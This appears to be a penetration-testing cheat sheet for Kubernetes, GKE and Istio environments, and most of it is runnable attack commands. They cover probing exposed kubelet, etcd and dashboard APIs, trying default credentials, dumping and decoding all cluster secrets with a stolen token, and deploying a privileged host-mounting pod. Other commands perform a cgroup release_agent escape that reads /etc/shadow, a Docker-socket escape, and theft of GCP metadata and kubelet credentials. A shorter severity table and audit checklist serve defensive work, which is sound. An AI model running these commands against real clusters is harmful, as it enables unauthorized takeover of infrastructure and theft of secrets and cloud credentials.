# Kubernetes & Container Security Testing

## External Reconnaissance (Detecting K8s from Outside)

### Indicators of Kubernetes

| Signal | Source | Confidence |
|--------|--------|-----------|
| `x-envoy-upstream-service-time` header | HTTP response | High (Istio/Envoy sidecar) |
| `server: istio-envoy` | HTTP response | High |
| `kiali*.domain` subdomain | DNS enum | High (Istio dashboard) |
| `/healthz`, `/readyz`, `/livez` returning 200 | HTTP probe | Medium (K8s probes) |
| Port 6443, 8443 open | Port scan | High (K8s API server) |
| Port 10250, 10255 open | Port scan | High (Kubelet) |
| Port 2379, 2380 open | Port scan | High (etcd) |
| Port 30000-32767 open | Port scan | Medium (NodePort services) |
| `*.svc.cluster.local` in error messages | HTTP response | High |
| `gke-*` in hostname/PTR records | DNS | High (GKE node pool) |
| `metadata.google.internal` in errors | HTTP response | High (GCP workload) |
| ArgoCD, Rancher, Lens subdomains | DNS enum | High |

### Common Exposed Paths

```bash
# K8s API server (if exposed)
PATHS=(
    "/api" "/api/v1" "/apis"
    "/api/v1/namespaces" "/api/v1/pods"
    "/api/v1/secrets" "/api/v1/nodes"
    "/healthz" "/readyz" "/livez"
    "/version" "/openapi/v2"
    "/.well-known/openid-configuration"
    "/apis/apps/v1/deployments"
)

for path in "${PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET:6443$path")
    echo "$path: $STATUS"
done

# Kubelet API (if 10250 exposed)
curl -sk "https://$TARGET:10250/pods"
curl -sk "https://$TARGET:10250/runningpods"
curl -sk "https://$TARGET:10250/metrics"
curl -sk "https://$TARGET:10250/healthz"

# Kubelet read-only (10255 - deprecated but sometimes still open)
curl -s "http://$TARGET:10255/pods"
curl -s "http://$TARGET:10255/metrics"

# etcd (if 2379 exposed - CRITICAL)
curl -s "http://$TARGET:2379/version"
curl -s "http://$TARGET:2379/v2/keys/?recursive=true"
# With etcdctl:
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only
```

---

## Exposed Dashboard & Management Interface Testing

### Kubernetes Dashboard

```bash
# Common paths
DASHBOARD_PATHS=(
    "/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
    "/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/"
    "/#/login"
    "/#/overview"
)

# Check for skip-login (CRITICAL if enabled)
# If dashboard loads without auth → full cluster access
curl -sk "https://$TARGET/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
```

### ArgoCD

```bash
# Default paths
curl -sk "https://argocd.$DOMAIN/"
curl -sk "https://argocd.$DOMAIN/api/v1/applications"
curl -sk "https://argocd.$DOMAIN/api/v1/clusters"
curl -sk "https://argocd.$DOMAIN/api/v1/repositories"

# Default credentials: admin / (auto-generated, but check argocd-initial-admin-secret)
# Try: admin/admin, admin/argocd, admin/password

# ArgoCD API token (if obtained)
curl -sk -H "Authorization: Bearer $ARGOCD_TOKEN" "https://argocd.$DOMAIN/api/v1/applications"
curl -sk -H "Authorization: Bearer $ARGOCD_TOKEN" "https://argocd.$DOMAIN/api/v1/clusters"
# Clusters endpoint reveals kubeconfig data!
```

### Grafana / Prometheus

```bash
# Grafana (default: admin/admin)
curl -s "https://grafana.$DOMAIN/api/health"
curl -s "https://grafana.$DOMAIN/api/datasources" -u admin:admin
curl -s "https://grafana.$DOMAIN/api/org/users" -u admin:admin

# Prometheus (often no auth)
curl -s "http://$TARGET:9090/api/v1/targets"
curl -s "http://$TARGET:9090/api/v1/label/__name__/values"
# Secrets in metrics:
curl -s "http://$TARGET:9090/api/v1/query?query=kube_secret_info"
```

### Kiali (Istio Dashboard)

```bash
# Default: no auth or token-based
curl -sk "https://kiali.$DOMAIN/api/namespaces"
curl -sk "https://kiali.$DOMAIN/api/istio/config"
curl -sk "https://kiali.$DOMAIN/api/workloads"
# Reveals: service mesh topology, all services, traffic patterns
```

---

## Post-Compromise: Service Account Token Exploitation

### Obtaining a Token

```bash
# From pod (if you have RCE/shell):
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# From exposed kubelet:
curl -sk "https://$TARGET:10250/pods" | jq '.items[].spec.volumes[] | select(.secret)'

# From CI/CD (GitHub Actions, GitLab CI):
# KUBECONFIG or KUBE_TOKEN in environment variables

# From heapdump/actuator:
# Look for kubeconfig content or service account tokens in memory
grep -a "eyJhbGciOiJSUzI1NiI" heapdump.bin  # JWT pattern for K8s SA tokens

# From cloud metadata (GKE):
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### RBAC Enumeration

```bash
# Set up kubectl with stolen token
export KUBECONFIG=/dev/null
kubectl --server=https://$K8S_API:6443 --token="$TOKEN" --insecure-skip-tls-verify=true get pods

# Or create kubeconfig:
kubectl config set-cluster target --server=https://$K8S_API:6443 --insecure-skip-tls-verify=true
kubectl config set-credentials stolen --token="$TOKEN"
kubectl config set-context target --cluster=target --user=stolen
kubectl config use-context target

# What can I do? (self-assessment)
kubectl auth can-i --list
kubectl auth can-i --list --namespace=default
kubectl auth can-i --list --namespace=kube-system

# Key permissions to check:
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i create pods/exec --all-namespaces
kubectl auth can-i get nodes
kubectl auth can-i create clusterrolebindings

# Enumerate namespaces
kubectl get namespaces

# Enumerate service accounts
kubectl get serviceaccounts --all-namespaces

# Check cluster roles
kubectl get clusterroles
kubectl get clusterrolebindings
kubectl describe clusterrolebinding cluster-admin
```

### Secret Extraction

```bash
# List all secrets (if permitted)
kubectl get secrets --all-namespaces
kubectl get secrets -n <namespace> -o json | jq '.items[] | {name: .metadata.name, type: .type}'

# Extract specific secret
kubectl get secret <name> -n <namespace> -o jsonpath='{.data}' | jq 'to_entries[] | {key: .key, value: (.value | @base64d)}'

# Common high-value secrets:
# - docker-registry (pull secrets → access private registries)
# - tls (certificates and private keys)
# - Opaque (application secrets, DB passwords, API keys)
# - service-account-token (other SA tokens for lateral movement)

# Extract all secrets in one shot:
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type != "kubernetes.io/service-account-token") | {namespace: .metadata.namespace, name: .metadata.name, data: (.data | to_entries[] | {key: .key, value: (.value | @base64d)})}'
```

### Pod Creation for Escape

```bash
# If you can create pods → mount host filesystem
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  hostNetwork: true
  hostPID: true
EOF

# Access host filesystem
kubectl exec -it attacker-pod -- /bin/sh
ls /host/etc/kubernetes/
cat /host/etc/kubernetes/admin.conf  # cluster-admin kubeconfig!
cat /host/root/.kube/config

# Access host processes (hostPID)
ps aux  # see all node processes

# Access host network (hostNetwork)
# Can reach other pods, metadata API, internal services
```

---

## Container Escape Techniques

### Privileged Container

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Mount host disk
fdisk -l  # find host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now access host filesystem

# Or via nsenter (if hostPID):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# You're now in the host's namespace
```

### hostPath Mount Exploitation

```bash
# If pod has hostPath volume mounted:
# Check what's mounted
mount | grep host
df -h

# Common exploitable hostPaths:
# /var/run/docker.sock → create containers on host
# /etc → modify host configs, add SSH keys
# / → full host access

# Docker socket escape:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Create privileged container via Docker API:
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

### CAP_SYS_ADMIN Escape

```bash
# Check capabilities
cat /proc/self/status | grep Cap
capsh --decode=<CapEff_value>

# If CAP_SYS_ADMIN:
# Method 1: cgroup escape (notify_on_release)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# Method 2: mount host filesystem
mount /dev/sda1 /mnt
```

---

## GKE-Specific Attacks

### Metadata API Exploitation

```bash
# GCP metadata endpoint (from within a pod)
METADATA="http://metadata.google.internal/computeMetadata/v1"
HEADER="Metadata-Flavor: Google"

# Get access token for the node's service account
curl -H "$HEADER" "$METADATA/instance/service-accounts/default/token"
# Returns: {"access_token":"ya29.xxx","expires_in":3600,"token_type":"Bearer"}

# Identify the service account
curl -H "$HEADER" "$METADATA/instance/service-accounts/default/email"

# Get project info
curl -H "$HEADER" "$METADATA/project/project-id"
curl -H "$HEADER" "$METADATA/project/numeric-project-id"

# Get instance attributes (may contain startup scripts with secrets)
curl -H "$HEADER" "$METADATA/instance/attributes/"
curl -H "$HEADER" "$METADATA/instance/attributes/startup-script"

# Get kube-env (contains kubelet credentials!)
curl -H "$HEADER" "$METADATA/instance/attributes/kube-env"
# Contains: KUBELET_CERT, KUBELET_KEY, CA_CERT → impersonate kubelet

# Network info
curl -H "$HEADER" "$METADATA/instance/network-interfaces/0/ip"
curl -H "$HEADER" "$METADATA/instance/network-interfaces/0/access-configs/0/external-ip"

# List all available metadata
curl -H "$HEADER" "$METADATA/?recursive=true" | python3 -m json.tool
```

### Workload Identity Abuse

```bash
# If Workload Identity is configured, pods get GCP IAM identity
# Check if Workload Identity is active:
curl -H "$HEADER" "$METADATA/instance/service-accounts/default/email"
# If returns: <k8s-sa>@<project>.iam.gserviceaccount.com → Workload Identity

# Use the token to access GCP services:
TOKEN=$(curl -s -H "$HEADER" "$METADATA/instance/service-accounts/default/token" | jq -r '.access_token')

# List GCS buckets
curl -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID"

# List GCS bucket contents
curl -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$BUCKET/o"

# Access BigQuery
curl -H "Authorization: Bearer $TOKEN" "https://bigquery.googleapis.com/bigquery/v2/projects/$PROJECT_ID/datasets"

# Access Secret Manager
curl -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets"

# Access Compute instances
curl -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones/$ZONE/instances"

# Check IAM permissions of the SA
curl -H "Authorization: Bearer $TOKEN" \
  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:testIamPermissions" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["storage.buckets.list","compute.instances.list","iam.serviceAccounts.list","secretmanager.secrets.list"]}'
```

### GKE Node Pool Escalation

```bash
# If you compromise one node, check for shared service accounts across node pools
# Nodes in the same pool share the same GCE service account

# From metadata, get the SA:
curl -H "$HEADER" "$METADATA/instance/service-accounts/"

# Default compute SA (if used) has broad permissions:
# - Read/write to all GCS buckets in project
# - Read access to most GCP APIs
# This is why dedicated node SAs are recommended

# Check if nodes use default compute SA:
# <project-number>-compute@developer.gserviceaccount.com = DEFAULT (overprivileged)
```

---

## Istio/Service Mesh Exploitation

### Sidecar Bypass

```bash
# If you're inside a pod with Istio sidecar:
# Traffic normally goes through envoy (port 15001/15006)
# Bypass sidecar to reach services directly:

# Method 1: Use pod IP directly (bypass envoy)
# Find target pod IPs:
kubectl get pods -o wide
curl http://<pod-ip>:<app-port>/api/endpoint

# Method 2: Use localhost (sidecar doesn't intercept loopback by default)
# If target service is on same node:
curl http://127.0.0.1:<nodeport>/

# Method 3: Excluded ports
# Check istio-proxy annotations for traffic.sidecar.istio.io/excludeOutboundPorts
kubectl get pod <name> -o yaml | grep -A5 "annotations"
```

### AuthorizationPolicy Gaps

```bash
# Common misconfigurations:
# 1. ALLOW policy only on ingress gateway, not on workloads
#    → pod-to-pod traffic unrestricted
# 2. Missing "deny all" default policy
#    → new services are open by default
# 3. Path-based rules without normalization
#    → /api/admin vs /api/Admin vs /api//admin

# Test from within a pod:
# Can we reach other services without proper auth?
for svc in $(kubectl get svc -o jsonpath='{.items[*].metadata.name}'); do
    echo -n "$svc: "
    curl -s -o /dev/null -w "%{http_code}" "http://$svc/"
done

# Test path normalization bypass:
curl "http://target-svc/Admin"
curl "http://target-svc/ADMIN"
curl "http://target-svc//admin"
curl "http://target-svc/./admin"
curl "http://target-svc/admin%2F"
```

### mTLS Assessment

```bash
# Check if mTLS is enforced (STRICT vs PERMISSIVE)
kubectl get peerauthentication --all-namespaces
kubectl get destinationrule --all-namespaces -o yaml | grep -A3 "tls:"

# If PERMISSIVE mode → plaintext connections accepted alongside mTLS
# This means: if you bypass the sidecar, you can talk plaintext to services

# Test plaintext access (from a pod without sidecar):
curl http://<service-ip>:<port>/  # Should fail if STRICT, succeeds if PERMISSIVE
```

---

## Common Misconfigurations

### Severity Guide

| Misconfiguration | Severity | Impact |
|-----------------|----------|--------|
| etcd exposed without auth | Critical | Full cluster compromise, all secrets |
| Kubelet API exposed (10250) | Critical | RCE on any pod, secret extraction |
| K8s Dashboard with skip-login | Critical | Full cluster admin access |
| Default SA with cluster-admin | Critical | Any pod can control entire cluster |
| Metadata API accessible from pods (no Workload Identity) | High | GCP SA token theft, cloud pivot |
| Privileged containers in production | High | Container escape → node compromise |
| Secrets in environment variables (not mounted) | Medium | Visible in pod spec, logs, describe |
| No NetworkPolicy (flat network) | Medium | Lateral movement between all pods |
| PERMISSIVE mTLS | Medium | Sidecar bypass allows plaintext |
| hostPath mounts to sensitive dirs | High | Read/write host filesystem |
| No PodSecurity admission | Medium | Allows privileged pod creation |
| ArgoCD with default admin password | High | Cluster management access |
| Grafana with default credentials | Medium | Infrastructure visibility, potential data access |

### Quick Audit Checklist

```bash
# 1. Check for privileged pods
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {namespace: .metadata.namespace, name: .metadata.name}'

# 2. Check for hostPath mounts
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath != null) | {namespace: .metadata.namespace, name: .metadata.name, paths: [.spec.volumes[] | select(.hostPath) | .hostPath.path]}'

# 3. Check for hostNetwork/hostPID
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostNetwork==true or .spec.hostPID==true) | {namespace: .metadata.namespace, name: .metadata.name, hostNetwork: .spec.hostNetwork, hostPID: .spec.hostPID}'

# 4. Check default service account permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default

# 5. Check for NetworkPolicies
kubectl get networkpolicies --all-namespaces
# If empty → flat network, all pods can talk to all pods

# 6. Check PodSecurity admission
kubectl get ns --show-labels | grep "pod-security"
# If no labels → no PodSecurity enforcement

# 7. Check for secrets in env vars (visible in pod spec)
kubectl get pods --all-namespaces -o json | jq '.items[] | {name: .metadata.name, env_secrets: [.spec.containers[].env[]? | select(.valueFrom.secretKeyRef) | .name]}'
```

---

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| kubectl | K8s API interaction | `brew install kubectl` |
| kube-hunter | Automated K8s pentest | `pip install kube-hunter` |
| peirates | K8s post-exploitation | `go install github.com/inguardians/peirates@latest` |
| kubeletctl | Kubelet API exploitation | `go install github.com/cyberark/kubeletctl@latest` |
| kubeaudit | Configuration auditing | `brew install kubeaudit` |
| trivy | Container image scanning | `brew install trivy` |
| kdigger | In-cluster recon | `go install github.com/quarkslab/kdigger@latest` |
| CDK | Container escape toolkit | `github.com/cdk-team/CDK` |

```bash
# kube-hunter (from external)
kube-hunter --remote $TARGET

# kube-hunter (from within pod)
kube-hunter --pod

# peirates (interactive post-exploitation)
peirates
# Menu-driven: enumerate SA, steal secrets, create pods, pivot

# kubeletctl (if 10250 exposed)
kubeletctl pods -s $TARGET
kubeletctl exec -s $TARGET -p <pod> -c <container> -- /bin/sh
```
